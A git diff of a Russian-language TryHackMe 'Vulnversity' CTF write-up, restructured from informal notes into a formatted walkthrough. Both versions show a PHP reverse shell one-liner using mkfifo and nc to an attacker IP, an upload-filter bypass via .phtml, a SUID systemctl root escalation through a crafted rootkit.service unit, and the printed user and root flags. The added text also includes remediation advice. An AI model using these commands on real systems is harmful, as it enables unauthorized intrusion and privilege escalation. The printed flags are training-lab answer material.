@@ -1,72 +1,104 @@
-# Vulnversity - TryHackMe
+# Vulnversity
 
-## Разведка
+**Сложность:** Easy
 
-Запускаем nmap для сканирования открытых портов
-Вывод:
+<img width="125" height="100" alt="image" src="https://github.com/user-attachments/assets/40e79827-91f9-4e4d-88a7-68bf00521aa6" />
+
+|  |  |
+| --- | --- |
+| **Platform** | TryHackMe |
+| **Link** | [https://tryhackme.com/r/room/vulnversity](https://tryhackme.com/r/room/vulnversity) |
+| **OS** | Linux |
+| **Tags** | `file-upload`, `phtml`, `bypass`, `suid`, `systemctl` |
+
+## Кратко
+
+Цепочка атаки: сканирование портов и обнаружение скрытой директории `/internal` → обход ограничений формы загрузки файлов путем смены расширения на `.phtml` → получение reverse shell и поиск пользовательского флага в `/home/bill` → эскалация привилегий до `root` через создание кастомного кастомного юнита `systemctl` с SUID-битом.
+
+## 1. Разведка
+
+### Сканирование портов
+
+```bash
+nmap -sV 10.80.147.22
+
 ```
-Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-08 17:39 -0400
-Nmap scan report for 10.80.147.22
-Host is up (0.046s latency).
-Not shown: 4994 closed tcp ports (reset)
-PORT     STATE SERVICE     VERSION
-21/tcp   open  ftp         vsftpd 3.0.5
-22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+
+```
+PORT     STATE SERVICE    VERSION
+21/tcp   open  ftp        vsftpd 3.0.5
+22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
 139/tcp  open  netbios-ssn Samba smbd 4
 445/tcp  open  netbios-ssn Samba smbd 4
-3128/tcp open  http-proxy  Squid http proxy 4.10
-3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
+3128/tcp open  http-proxy Squid http proxy 4.10
+3333/tcp open  http       Apache httpd 2.4.41 ((Ubuntu))
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 27.91 seconds
 ```
-запускаем Gobuster через gobuster dir -u http://10.80.147.22:3333 -w /usr/share/wordlists/dirb/big.txt -x php
-Вывод:
-```
-.htpasswd            (Status: 403) [Size: 279]
-.htaccess.php        (Status: 403) [Size: 279]
-.htaccess            (Status: 403) [Size: 279]
-.htpasswd.php        (Status: 403) [Size: 279]
-css                  (Status: 301) [Size: 317] [--> http://10.80.147.22:3333/css/]
-fonts                (Status: 301) [Size: 319] [--> http://10.80.147.22:3333/fonts/]
-images               (Status: 301) [Size: 320] [--> http://10.80.147.22:3333/images/]
-internal             (Status: 301) [Size: 322] [--> http://10.80.147.22:3333/internal/]
-js                   (Status: 301) [Size: 316] [--> http://10.80.147.22:3333/js/]
-server-status        (Status: 403) [Size: 279]
-Progress: 40938 / 40938 (100.00%)
-===============================================================
-Finished
-===============================================================
-```
-## Веб шелл
 
-переходим в директорию /internal и видим панель для загрузки файлов, пробуем загрузить .phtml реверс шелл.
-Код шелла:
-`<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.129.112 8000 >/tmp/f"); ?>`
-загрузка проходит успешно. Т.к. gobuster не нашел никаких папок для загруженных файлов, возможно они находятся в /internal, проверяю /internal/uploads и нахожу свой шелл. На атакующей машине запускаю `nc -lnvp 8000` и запускаю шелл в веб загрузках. и соединение установлено. Строкой python3 -c 'import pty; pty.spawn("/bin/bash")' стабилизируем шелл.
-Начинаю лазить по папкам. Перехожу по одной директории назад параллельно провверяя каждую, дохожу до корня. Решаю проверить директорию /home, в ней две папки /bill и /ubuntu. В папке пользователя bill нахожу user.txt и проверяю что внутри.
-Содержимое:
-`8bd7992fbe8a6ad22a63361004cfcedb`
+По результатам сканирования выявили открытые порты FTP (21), SSH (22), Samba (139/445), Squid proxy (3128) и веб-сервер Apache на порту 3333.
 
-## Повышение привилегий
+### Перечисление сервисов
 
-Пользовательский флаг найден, пора повышать привилегии, ищем файлы с suid битами командой `find / -perm -4000 2>/dev/null`
-в выводе я заметил:
-`/bin/systemctl`
-с помощью этой программы, если на ней установлен suid бит, как в нашем случае, можно повысиить привилегии введя такой скрипт:
+Для веб-сервера на порту 3333 запущен перебор директорий с помощью Gobuster:
+
+```bash
+gobuster dir -u http://10.80.147.22:3333 -w /usr/share/wordlists/dirb/big.txt -x php
+
 ```
-echo '[Service]
-Type=oneshot
-ExecStart=/path/to/command
-[Install]
-WantedBy=multi-user.target' >/path/to/temp-file.service
-systemctl link /path/to/temp-file.service
-systemctl enable --now /path/to/temp-file.service
+
 ```
-Файл file.service  - это наш файл rootkit.service с конфигами для systemctl как я понял, после того как порасспрашивал нейронку
-запускать в ExecStart мы будем `/bin/bash -c "cp /bin/bash /tmp/bash && chmod +s /tmp/bash"`, эта команда скопирует bash в директорию /tmp, потому что в /tmp обычно права на создание и копирование туда файлов не требуется никому, даем этому bash в tmp suid-бит, в нашем случае скрипт будет выглядеть вот так:
+/css                  (Status: 301) [Size: 317] [--> http://10.80.147.22:3333/css/]
+/fonts                (Status: 301) [Size: 319] [--> http://10.80.147.22:3333/fonts/]
+/images               (Status: 301) [Size: 320] [--> http://10.80.147.22:3333/images/]
+/internal             (Status: 301) [Size: 322] [--> http://10.80.147.22:3333/internal/]
+/js                   (Status: 301) [Size: 316] [--> http://10.80.147.22:3333/js/]
+
 ```
+
+В ходе перечисления обнаружена ключевая директория `/internal`, содержащая форму загрузки файлов, а также скрытый каталог подгрузки файлов `/internal/uploads`.
+
+## 2. Получение доступа
+
+Форма на странице `/internal` блокирует загрузку файлов `.php`. Фильтрация обойдена переименованием файла в `.phtml`.
+
+Код используемого PHP reverse shell:
+
+```php
+<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.129.112 8000 >/tmp/f"); ?>
+
+```
+
+После загрузки запускаем слушатель `nc -lnvp 8000` и обращаемся к файлу по пути `/internal/uploads/shell.phtml`. Полученный доступ стабилизируем через PTY:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+```
+
+В директории `/home/bill` находим первый флаг.
+
+**Флаг пользователя:** `8bd7992fbe8a6ad22a63361004cfcedb`
+
+## 3. Повышение привилегий
+
+Поиск бинарников с установленным SUID-битом:
+
+```bash
+find / -perm -4000 2>/dev/null
+
+```
+
+```
+/bin/systemctl
+
+```
+
+Среди стандартных файлов обнаружена утилита `/bin/systemctl` с SUID-битом. Наличие SUID на `systemctl` позволяет регистрировать и запускать пользовательские службы с правами `root`.
+
+В директории `/tmp` создаем конфигурационный файл службы `rootkit.service`, копирующий `/bin/bash` с установкой SUID-бита:
+
+```bash
 cat << 'EOF' > /tmp/rootkit.service
 [Unit]
 Description=Rootkit Service
@@ -79,10 +111,36 @@ ExecStart=/bin/bash -c "cp /bin/bash /tmp/bash && chmod +s /tmp/bash"
 [Install]
 WantedBy=multi-user.target
 EOF
+
 ```
-Запускаем.
-Дальше нам нужно дать ссылку файла rootkit.service для systemd:
-`systemctl link /tmp/rootkit.service`
-А потом сразу запустить службу с флагом --now
-`sudo systemctl enable --now /tmp/rootkit.service`
-после этого можно прописывать tmp/bash с флагом -p, для того, чтобы bash не сбрасывал привилегии, и я получаю рута. Идем в директорию /root и там сразу лежит флаг root.txt в таком виде: `a58ff8579f0a9270368d33a9966c7fd5`
+
+Создаем ссылку на юнит и запускаем службу через `systemctl`:
+
+```bash
+systemctl link /tmp/rootkit.service
+systemctl enable --now /tmp/rootkit.service
+
+```
+
+После выполнения службы запускаем созданный бинарник `/tmp/bash -p` без сброса привилегий и получаем root-доступ:
+
+```bash
+/tmp/bash -p
+# whoami
+root
+# cat /root/root.txt
+a58ff8579f0a9270368d33a9966c7fd5
+
+```
+
+**Флаг root:** `a58ff8579f0a9270368d33a9966c7fd5`
+
+## Выводы
+
+* **Уязвимости:** Слабо настроенная фильтрация загружаемых файлов (черный список вместо белого), избыточные разрешения на системную утилиту `/bin/systemctl` (SUID-бит).
+* **Как предотвратить:** Использовать жесткие белые списки расширений при загрузке файлов, отключать исполнение скриптов в каталоге загрузок (`uploads`), избегать присвоения SUID-битов утилитам управления системными службами.
+* **Чему научился:** Способам обхода расширений исполнения PHP через `.phtml` и технике повышения привилегий через создание вредоносных системных юнитов в SUID `systemctl`.
+
+## Использованные инструменты
+
+`nmap`, `gobuster`, `netcat`, `python`, `systemctl`
